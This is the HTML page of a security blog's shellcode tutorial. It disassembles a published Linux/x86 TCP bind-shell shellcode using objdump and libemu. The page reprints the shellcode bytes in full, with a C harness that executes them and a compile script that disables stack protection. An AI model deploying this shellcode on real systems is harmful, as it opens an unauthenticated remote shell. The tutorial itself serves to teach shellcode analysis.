@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="norsec0de">
+<meta name="description" content="About a month ago I signed up for the Securitytube Linux Assembly Expert certification to get a deeper understanding of assembly and GDB. Doing so has helped me understand what is actually going on in the registers and not just relying on &amp;ldquo;hail-mary&amp;rdquo; advice like &amp;ldquo;use pop, pop, ret when dealing with SEH.&amp;rdquo; If you&amp;rsquo;re interested in Assembly or writing shellcode, I&amp;rsquo;d highly recommend you take the certification." />
+<meta name="keywords" content="infosec, norsey, norsec0de, assembly, shellcode, tutorial" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://norsec0de.github.io/posts/part-1-disassembling-and-understanding-shellcode/" />
+
+
+    <title>
+        
+            part 1: disassembling and understanding shellcode :: norsey&#39;s hideout 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://norsec0de.github.io/main.393856bf2c430bb6c01d7af07c6fe966e7cce8073435cfbbc46e590bab7405ef.css">
+
+
+
+
+
+
+<meta itemprop="name" content="part 1: disassembling and understanding shellcode">
+<meta itemprop="description" content="About a month ago I signed up for the Securitytube Linux Assembly Expert certification to get a deeper understanding of assembly and GDB. Doing so has helped me understand what is actually going on in the registers and not just relying on &ldquo;hail-mary&rdquo; advice like &ldquo;use pop, pop, ret when dealing with SEH.&rdquo; If you&rsquo;re interested in Assembly or writing shellcode, I&rsquo;d highly recommend you take the certification.">
+<meta itemprop="datePublished" content="2014-04-24T11:58:47+00:00" />
+<meta itemprop="dateModified" content="2014-04-24T11:58:47+00:00" />
+<meta itemprop="wordCount" content="1835">
+<meta itemprop="image" content="http://norsec0de.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="assembly,shellcode,tutorial," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://norsec0de.github.io/"/>
+
+<meta name="twitter:title" content="part 1: disassembling and understanding shellcode"/>
+<meta name="twitter:description" content="About a month ago I signed up for the Securitytube Linux Assembly Expert certification to get a deeper understanding of assembly and GDB. Doing so has helped me understand what is actually going on in the registers and not just relying on &ldquo;hail-mary&rdquo; advice like &ldquo;use pop, pop, ret when dealing with SEH.&rdquo; If you&rsquo;re interested in Assembly or writing shellcode, I&rsquo;d highly recommend you take the certification."/>
+
+
+
+
+
+    <meta property="article:section" content="shellcode" />
+
+    <meta property="article:section" content="tutorial" />
+
+
+
+    <meta property="article:published_time" content="2014-04-24 11:58:47 &#43;0000 &#43;0000" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://norsec0de.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">norsey&#39;s hideout</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://norsec0de.github.io/posts">intel</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://norsec0de.github.io/posts/part-1-disassembling-and-understanding-shellcode/">part 1: disassembling and understanding shellcode</a></h2>
+
+            
+
+            
+
+            <div class="post-content">
+                <figure>
+    <img src="http://i.imgur.com/f8xqQgX.png"/> 
+</figure>
+
+<p>About a month ago I signed up for the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">Securitytube Linux Assembly Expert</a> certification to get a deeper understanding of assembly and GDB. Doing so has helped me understand what is actually going on in the registers and not just relying on &ldquo;hail-mary&rdquo; advice like &ldquo;<em>use pop, pop, ret when dealing with SEH</em>.&rdquo; If you&rsquo;re interested in Assembly or writing shellcode, I&rsquo;d highly recommend you take the certification.</p>
+<p>My first SLAE assignment was to write my own bind shell. I don&rsquo;t know C well enough to code straight from memory, and even though I understand how individual assembly instructions affect data in the registers and the stack, I didn&rsquo;t know how to string these together to create working shellcode. I couldn&rsquo;t find many tutorials devoted to the subject so I decided to just dive in and build it from scratch.</p>
+<p>I&rsquo;ve created this tutorial to help others who understand basic assembly instructions but who do not know how to string it together to create useful shellcode of their own. Following this post through to the end should bring you up to a level of understanding where you don&rsquo;t &ldquo;need&rdquo; to rely on other peoples scripts to build a bind shell and can start writing your own. My hope is that you will not feel overwhelmed when looking at shellcode and will start to explore, publish and write your own shellcode.</p>
+<blockquote>
+<p>NOTE: If you are already competent at compiling, disassembling or debugging shellcode, skip to <a href="http://norsec0de.github.io/posts/part-2-building-the-shellcode/">Part 2: Building the Shellcode</a>.</p>
+</blockquote>
+<p>Lets get started&hellip;</p>
+<h1 id="wtf-is-a-bind-shell">WTF is a bind shell?</h1>
+<p>Before starting this exercise, my understanding of a bind shell was the following:</p>
+<blockquote>
+<p>a socket that allows you to send commands to a program and receive the responses over a network.
+This is not very helpful when trying to build your own except that you think you need a socket, a port and an executable.</p>
+</blockquote>
+<p>Instead of guessing, lets take a look at some other bind shell shellcode and see what it does.</p>
+<p><a href="http://www.metasploit.com/">Metasploit</a> is far from the only way to get your hands on shellcode. There are several sites that host shellcode that you can use for yourself such as <a href="http://www.exploit-db.com/shellcode/">Exploit Database</a> from <a href="http://www.offensive-security.com/">Offensive Security</a>, <a href="http://www.projectshellcode.com/?q=node/5">Project Shellcode</a> from <a href="https://twitter.com/tyronmiller">Ty Miller</a> and <a href="http://shell-storm.org/shellcode/">Shell Storm</a> from <a href="https://twitter.com/JonathanSalwan">Jonathan Salwan</a>.</p>
+<p>Lets grab a small bind shell from <a href="http://shell-storm.org/shellcode/">Shell Storm</a> and see what it does.</p>
+<p>First, create a folder to place your working files in.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mkdir bindshell
+</code></pre></div><p>Go to the following url and take a look at the content. It contains the content of a C file and instructions on how to compile and run it.</p>
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-836.php">http://shell-storm.org/shellcode/files/shellcode-836.php</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> Tiny Shell Bind TCP Shellcode - C Language
+</span><span style="color:#75715e"> Linux/x86
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> Written in 2013 by Geyslan G. Bem, Hacking bits
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">   http://hackingbits.com
+</span><span style="color:#75715e">   geyslan@gmail.com
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> This source is licensed under the Creative Commons
+</span><span style="color:#75715e"> Attribution-ShareAlike 3.0 Brazil License.
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> To view a copy of this license, visit
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">   http://creativecommons.org/licenses/by-sa/3.0/
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> You are free:
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">    to Share - to copy, distribute and transmit the work
+</span><span style="color:#75715e">    to Remix - to adapt the work
+</span><span style="color:#75715e">    to make commercial use of the work
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> Under the following conditions:
+</span><span style="color:#75715e">   Attribution - You must attribute the work in the manner
+</span><span style="color:#75715e">                 specified by the author or licensor (but
+</span><span style="color:#75715e">                 not in any way that suggests that they
+</span><span style="color:#75715e">                 endorse you or your use of the work).
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">   Share Alike - If you alter, transform, or build upon
+</span><span style="color:#75715e">                 this work, you may distribute the
+</span><span style="color:#75715e">                 resulting work only under the same or
+</span><span style="color:#75715e">                 similar license to this one.
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">*/</span>
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> tiny_shell_bind_tcp_shellcode
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> * 73 bytes
+</span><span style="color:#75715e"> * null-free if the port is
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_shellcode.c -o tiny_shell_bind_tcp_shellcode
+</span><span style="color:#75715e">
+</span><span style="color:#75715e"> Testing
+</span><span style="color:#75715e"> # ./tiny_shell_bind_tcp_shellcode
+</span><span style="color:#75715e"> # nc 127.0.0.1 11111
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">*/</span>
+
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
+
+main ()
+{
+
+        <span style="color:#75715e">// When the Port contains null bytes, printf will show a wrong shellcode length.
+</span><span style="color:#75715e"></span>
+	printf(<span style="color:#e6db74">&#34;Shellcode Length:  %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strlen(code));
+
+	<span style="color:#75715e">// Pollutes all registers ensuring that the shellcode runs in any circumstance.
+</span><span style="color:#75715e"></span>
+	__asm__ (<span style="color:#e6db74">&#34;movl $0xffffffff, %eax</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+		 <span style="color:#e6db74">&#34;movl %eax, %ebx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+		 <span style="color:#e6db74">&#34;movl %eax, %ecx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+		 <span style="color:#e6db74">&#34;movl %eax, %edx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+		 <span style="color:#e6db74">&#34;movl %eax, %esi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+		 <span style="color:#e6db74">&#34;movl %eax, %edi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+		 <span style="color:#e6db74">&#34;movl %eax, %ebp</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+
+	<span style="color:#75715e">// Setting the port
+</span><span style="color:#75715e"></span>		 <span style="color:#e6db74">&#34;movw $0x672b, (code+20)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+
+	<span style="color:#75715e">// Calling the shellcode
+</span><span style="color:#75715e"></span>		 <span style="color:#e6db74">&#34;call code&#34;</span>);
+
+}
+</code></pre></div><p>This may look big and scary now but we&rsquo;re only interested in seeing what it does so we can figure out how to write our own.</p>
+<p>Leave that page open for now, we&rsquo;ll come back to it shortly.</p>
+<p>Create a file in your bindshell folder called shellcode.c</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd bindshell
+nano shellcode.c
+</code></pre></div><p>Paste the following code into the shellcode.c file we just opened.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+<span style="color:#e6db74">&#34;&#34;</span>;
+
+main()
+{
+
+	printf(<span style="color:#e6db74">&#34;Shellcode Length:  %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strlen(code));
+
+	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+
+	ret();
+
+}
+</code></pre></div><p>Now grab just the shellcode from the Shell Storm page and paste it into this new file ensuring the formatting looks like this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
+
+main()
+{
+
+	printf(<span style="color:#e6db74">&#34;Shellcode Length:  %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strlen(code));
+
+	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+
+	ret();
+
+}
+</code></pre></div><p>Save and close the file</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">CTRL + O              &lt;== Save File
+{ENTER/RETURN KEY}    &lt;== Accept the Filename
+CTRL X                &lt;== Exit&lt;/pre&gt;
+</code></pre></div><p>Great, we&rsquo;ve just created a C file that will print our shellcode length and then run it. but before we can do that, we need to compile it into a binary file.</p>
+<p>To be able to compile this file, we need a compiler such as <a href="http://gcc.gnu.org/">GCC (GNU Compiler Collection)</a> which will turn our source code into a binary file.</p>
+<p>Assuming you&rsquo;re running this on a Debian based distro such as Ubuntu, Kali Linux, BackTrack or your own distro, you can use Aptitude to install GCC</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install gcc
+</code></pre></div><p>Because we&rsquo;re going to compile shellcode often, lets create a script that we can reuse to compile our shellcode.c file.</p>
+<p>Create a new file called <code>compile.sh</code> and paste the following into it</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>
+	<span style="color:#66d9ef">then</span>
+		gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
+	<span style="color:#66d9ef">else</span>
+		gcc -m32 -fno-stack-protector -z execstack $1.c -o $1
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>What this file will do is check to see if you have passed any argument to the script, if not it assumes that the file you want to compile is called &ldquo;shellcode.c&rdquo; which in this case is true.</p>
+<p>Then the script will run GCC with the following options:<br>
+<code>-m32</code> tells the compiler we&rsquo;re building this source code for a 32 bit operating system.<br>
+<code>-fno-stack-protection</code> will disable the stack protection mechanisms in GCC.<br>
+<code>-z execstack</code> will allow our stack to be executable.<br>
+<code>shellcode.c</code> is the file with the source code.<br>
+<code>-o shellcode</code> is the binary file we want to create with our source code.</p>
+<p>Now we need to make this new script executable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chmod +x compile.sh
+</code></pre></div><p>That&rsquo;s it, run the script and you should have a brand new binary that can create bind shells.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./compile.sh
+</code></pre></div><figure>
+    <img src="http://i.imgur.com/z4O3OcW.png"/> 
+</figure>
+
+<p>We&rsquo;re not interested in running this binary right now, we&rsquo;re only interested in finding out what it does. So lets take a look inside and see what this shellcode is doing.</p>
+<p>To do this, we are going to use a tool called <a href="https://sourceware.org/binutils/docs/binutils/objdump.html">objdump</a>, part of <a href="https://sourceware.org/binutils/docs/binutils/index.html">Gnu Binary Utilities</a>, which will look at our shellcode and show us what it&rsquo;s doing.</p>
+<p>To install these tools run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install binutils
+</code></pre></div><p>Now that we have objdump installed, lets disassemble our binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D shellcode -M intel
+</code></pre></div><p>Wow, that is a lot of assembly code. The part we&rsquo;re interested in is:</p>
+<pre><code class="language-objdump" data-lang="objdump">08049700 &lt;code&gt;:
+  8049700:	31 db                	xor    ebx,ebx
+  8049702:	f7 e3                	mul    ebx
+  8049704:	b0 66                	mov    al,0x66
+  8049706:	43                   	inc    ebx
+  8049707:	52                   	push   edx
+  8049708:	53                   	push   ebx
+  8049709:	6a 02                	push   0x2
+  804970b:	89 e1                	mov    ecx,esp
+  804970d:	cd 80                	int    0x80
+  804970f:	5b                   	pop    ebx
+  8049710:	5e                   	pop    esi
+  8049711:	52                   	push   edx
+  8049712:	66 68 2b 67          	pushw  0x672b
+  8049716:	6a 10                	push   0x10
+  8049718:	51                   	push   ecx
+  8049719:	50                   	push   eax
+  804971a:	b0 66                	mov    al,0x66
+  804971c:	89 e1                	mov    ecx,esp
+  804971e:	cd 80                	int    0x80
+  8049720:	89 51 04             	mov    DWORD PTR [ecx+0x4],edx
+  8049723:	b0 66                	mov    al,0x66
+  8049725:	b3 04                	mov    bl,0x4
+  8049727:	cd 80                	int    0x80
+  8049729:	b0 66                	mov    al,0x66
+  804972b:	43                   	inc    ebx
+  804972c:	cd 80                	int    0x80
+  804972e:	59                   	pop    ecx
+  804972f:	93                   	xchg   ebx,eax
+  8049730:	6a 3f                	push   0x3f
+  8049732:	58                   	pop    eax
+  8049733:	cd 80                	int    0x80
+  8049735:	49                   	dec    ecx
+  8049736:	79 f8                	jns    8049730 &lt;code+0x30&gt;
+  8049738:	b0 0b                	mov    al,0xb
+  804973a:	68 2f 2f 73 68       	push   0x68732f2f
+  804973f:	68 2f 62 69 6e       	push   0x6e69622f
+  8049744:	89 e3                	mov    ebx,esp
+  8049746:	41                   	inc    ecx
+  8049747:	cd 80                	int    0x80
+  8049749:	00 00                	add    BYTE PTR [eax],al
+</code></pre><p>We can see <code>xor</code>, <code>push</code>, <code>pop</code>, <code>inc</code> and some other functions but we still don&rsquo;t really know the steps involved to create our own bind shell.</p>
+<p>Lets move onto something that will make this even easier to understand.</p>
+<p><a href="http://libemu.carnivore.it/">Libemu</a> is a x86 Shellcode Emulation tool that can make following and understanding shellcode much easier.</p>
+<p>Download and install libemu, following this procedure:</p>
+<p>Firstly, we&rsquo;re going to need Git. If you don&rsquo;t already have git installed, install it now</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install git
+</code></pre></div><p>Once you have git installed, clone the libemu repo into your temp folder</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /tmp
+git clone git://git.carnivore.it/libemu.git
+</code></pre></div><p>You&rsquo;ll also need some dependencies to get libemu installed and running</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install build-essential autoconf libtool python-dev graphviz
+</code></pre></div><p>Now go into the libemu folder we cloned</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /tmp/libemu/
+</code></pre></div><p>Run these commands to configure and build libemu</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">autoreconf -v -i
+./configure --enable-python-bindings --prefix<span style="color:#f92672">=</span>/opt/libemu
+sudo make install
+sudo ldconfig -n /opt/libemu/lib
+</code></pre></div><p>We should now have a libemu folder installed in <code>/opt/libemu/</code></p>
+<p>We now need to prepare our shellcode for libemu. Start by grabbing just the shellcode and place it in a file called <code>shellcode.hex</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat shellcode.hex
+<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>6a 
+<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">68</span> 
+<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>e1 
+<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>cd 
+<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>3f 
+<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>2f 
+<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>e3 
+<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">80</span>
+</code></pre></div><p>Next, we&rsquo;re going to create an alias called <a href="http://www.aldeid.com/wiki/Libemu/sctest">hex2raw</a>.</p>
+<p>Add this line to your <code>.bashrc</code> file if you want this to be permanently available:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">alias hex2raw<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tr -d &#39;\\\x&#39; | xxd -r -p&#34;</span>
+</code></pre></div><p>Now lets convert our hex code to raw code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat shellcode.hex | hex2raw &gt; shellcode.raw
+</code></pre></div><p>If all went well, you should have a new file called shellcode.raw</p>
+<figure>
+    <img src="http://i.imgur.com/92bg4y0.png"/> 
+</figure>
+
+<p>We now have everything we need to see what this bind shell is doing, lets run libemu on this raw code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat shellcode.raw | /opt/libemu/bin/sctest -vvv -Ss <span style="color:#ae81ff">99999</span> -G shellcode.dot
+</code></pre></div><p>The last step is to convert the shellcode.dot graph into an image so we can view it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dot -Tpng -o shellcode.png shellcode.dot
+</code></pre></div><p>Great, we now have a shellcode.png file, lets take a look at it</p>
+
+    <img src="http://i.imgur.com/8hyY41M.png"  class="left"  />
+
+
+<p>EPIC, now we can see what this shellcode is doing a lot clearer and we can also see the system calls that it is making. We will use these to create our own bind shell shellcode.</p>
